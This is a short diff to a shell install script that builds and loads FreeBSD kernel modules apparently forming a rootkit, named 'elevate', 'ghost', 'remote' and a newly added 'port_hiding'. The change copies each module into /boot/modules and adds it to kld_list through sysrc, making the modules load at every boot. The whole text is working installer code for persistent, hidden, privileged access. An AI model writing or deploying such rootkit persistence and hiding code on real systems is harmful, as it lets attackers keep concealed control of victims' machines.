@@ -17,7 +17,7 @@ fi
 # The Makefile should be named Makefile.module
 # The .ko file should be named module.ko
 # The c file should be named module-kld.c
-klds="elevate ghost remote"
+klds="elevate ghost remote port_hiding"
 
 for kld in ${klds}; do
   # Clean kld
@@ -31,8 +31,15 @@ for kld in ${klds}; do
     continue
   fi
 
-  # Load klds
   if [ -e "./$kld.ko" ]; then
+    # Copy to /boot/modules
+    mkdir -p /boot/modules
+    cp "./$kld.ko" /boot/modules
+
+    # Configure autoloading for persistence
+    sysrc kld_list+="$kld"
+
+    # Load klds
     kldload "./$kld.ko"
     if [ "$?" -ne 0 ]; then
       echo "Warning: failed to load $kld.ko with kldload"
